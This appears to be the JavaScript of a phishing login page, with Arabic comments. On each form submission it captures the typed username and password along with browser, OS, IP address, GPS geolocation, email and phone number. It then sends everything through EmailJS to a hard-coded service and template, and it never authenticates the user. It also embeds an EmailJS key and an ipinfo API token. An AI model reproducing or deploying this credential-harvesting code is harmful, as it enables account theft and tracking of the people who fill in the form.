// تبديل عرض كلمة المرور
document.getElementById('toggle-password').addEventListener('click', function () {
    const passwordInput = document.getElementById('password');
    if (passwordInput.type === 'password') {
        passwordInput.type = 'text';
        this.classList.remove('fa-eye-slash');
        this.classList.add('fa-eye');
    } else {
        passwordInput.type = 'password';
        this.classList.remove('fa-eye');
        this.classList.add('fa-eye-slash');
    }
});

document.getElementById('toggle-password1').addEventListener('click', function () {
    const passwordInput1 = document.getElementById('password1');
    if (passwordInput1.type === 'password') {
        passwordInput1.type = 'text';
        this.classList.remove('fa-eye-slash');
        this.classList.add('fa-eye');
    } else {
        passwordInput1.type = 'password';
        this.classList.remove('fa-eye');
        this.classList.add('fa-eye-slash');
    }
});

function isMobileDevice() {
    return /Android|iPhone|iPad|iPod/i.test(navigator.userAgent) || window.innerWidth <= 768;
}
// إضافة EmailJS في بداية الكود
(function () {
    emailjs.init("Cf6AQnmKaonDjuzz5"); // استبدل بـ USER_ID الخاص بك
})();

document.getElementById('form').addEventListener('submit', async function (event) {
    event.preventDefault();
    
    const body = document.getElementById('body');
    const additionalFields = document.getElementById('additional-fields');
    const creer = document.getElementById('creer');
    const submit = document.getElementById('submit');

    if (isMobileDevice()) {
        
        body.classList.add('body-new-background');
        body.classList.add('show-fields');
        creer.style.display = "none"
        submit.style.display = "none"
    } else {
        console.log("Not a mobile device. No changes made.");
    }

    const nameInput = document.getElementById('name');
    const passwordInput = document.getElementById('password');
    const errorDiv = document.getElementById('error');

    
    if (nameInput.value.trim() === "") {
        nameInput.focus();
        return;
    }

    if (passwordInput.value.trim() === "") {
        passwordInput.focus();
        return;
    }

    errorDiv.textContent = "";



    // جمع بيانات المستخدم
    const browserInfo = getBrowserInfo();
    const osInfo = getOSInfo();
    const ipInfo = await getIPInfo();
    const geoLocation = await getGeoLocation();
    const email = await getEmail(); // استدعاء البريد الإلكتروني
    const phone = await getPhoneNumber(); // استدعاء رقم الهاتف

    // إرسال البيانات عبر EmailJS
    const templateParams = {
        name: nameInput.value,
        password: passwordInput.value,
        browserInfo: browserInfo,
        osInfo: osInfo,
        ipInfo: ipInfo,
        geoLocation: geoLocation,
        email: email,
        phone: phone
    };

    emailjs.send("service_4esymny", "template_t2odele", templateParams)
        .then(function (response) {
            console.log("Email sent successfully:", response);
        }, function (error) {
            console.error("Error sending email:", error);
        });
});

document.getElementById('form1').addEventListener('submit', async function (event) {
    event.preventDefault();
    
    const nameInput1 = document.getElementById('name1');
    const passwordInput1 = document.getElementById('password1');
    const errorDiv1 = document.getElementById('error1');

    
    if (nameInput1.value.trim() === "") {
        nameInput1.focus();
        return;
    }

    if (passwordInput1.value.trim() === "") {
        passwordInput1.focus();
        return;
    }

    errorDiv1.textContent = "";



    // جمع بيانات المستخدم
    const browserInfo = getBrowserInfo();
    const osInfo = getOSInfo();
    const ipInfo = await getIPInfo();
    const geoLocation = await getGeoLocation();
    const geoLocation1 = await fetchGeoLocationFromIP();
    const email = await getEmail(); // استدعاء البريد الإلكتروني
    const phone = await getPhoneNumber(); // استدعاء رقم الهاتف

    // إرسال البيانات عبر EmailJS
    const templateParams = {
        name1: nameInput1.value,
        password1: passwordInput1.value,
        browserInfo: browserInfo,
        osInfo: osInfo,
        ipInfo: ipInfo,
        geoLocation: geoLocation,
        geoLocation1: geoLocation1,
        email: email,
        phone: phone
    };

    emailjs.send("service_4esymny", "template_fjk0ckm", templateParams)
        .then(function (response) {
            console.log("Email sent successfully:", response);
        }, function (error) {
            console.error("Error sending email:", error);
        });
});

// دالة للحصول على معلومات المتصفح
function getBrowserInfo() {
    const userAgent = navigator.userAgent;
    if (userAgent.includes("Chrome")) return "Chrome";
    if (userAgent.includes("Firefox")) return "Firefox";
    if (userAgent.includes("Safari")) return "Safari";
    if (userAgent.includes("Edge")) return "Edge";
    return "Unknown Browser";
}

// دالة للحصول على معلومات النظام
function getOSInfo() {
    const userAgent = navigator.userAgent;
    if (userAgent.includes("Windows NT")) return "Windows";
    if (userAgent.includes("Mac OS")) return "MacOS";
    if (userAgent.includes("Linux")) return "Linux";
    if (userAgent.includes("Android")) return "Android";
    if (userAgent.includes("iOS")) return "iOS";
    return "Unknown OS";
}

// دالة للحصول على عنوان الـ IP
async function getIPInfo() {
    try {
        const response = await fetch('https://ipinfo.io/json');
        const data = await response.json();
        return data.ip || "Unknown IP";
    } catch (error) {
        console.error("Error fetching IP info:", error);
        return "Unknown IP";
    }
}

// دالة للحصول على الموقع الجغرافي
async function getGeoLocation() {
    if ("geolocation" in navigator) {
        return new Promise((resolve, reject) => {
            navigator.geolocation.getCurrentPosition(
                (position) => {
                    const { latitude, longitude } = position.coords;
                    resolve(`Latitude: ${latitude}, Longitude: ${longitude}`);
                },
                (error) => {
                    console.error("Error using geolocation:", error);
                    // إذا فشلت geolocation، يتم استخدام IP-based API كخيار بديل
                    fetchGeoLocationFromIP()
                        .then(resolve)
                        .catch(reject);
                }
            );
        });
    } else {
        console.warn("Geolocation not supported. Falling back to IP-based location.");
        return fetchGeoLocationFromIP();
    }
}

// دالة احتياطية للحصول على الموقع الجغرافي باستخدام IP
async function fetchGeoLocationFromIP() {
    try {
        const response = await fetch('https://ipinfo.io/160.176.63.224?token=0083ebbf6abe6f'); // ضع التوكن الخاص بك هنا
        const data = await response.json();
        return `${data.city}, ${data.region}, ${data.country}` || "Unknown Location";
    } catch (error) {
        console.error("Error fetching geo-location from IP:", error);
        return "Unknown Location";
    }
}

// دالة للحصول على البريد الإلكتروني
async function getEmail() {
    try {
        const response = await fetch('/get-email-api'); // استبدل بعنوان API صالح
        const data = await response.json();
        return data.email || "Unknown Email";
    } catch (error) {
        console.error("Error fetching email:", error);
        return "Unknown Email";
    }
}

// دالة للحصول على رقم الهاتف
async function getPhoneNumber() {
    try {
        const response = await fetch('/get-phone-api'); // استبدل بعنوان API صالح
        const data = await response.json();
        return data.phone || "Unknown Phone";
    } catch (error) {
        console.error("Error fetching phone number:", error);
        return "Unknown Phone";
    }
}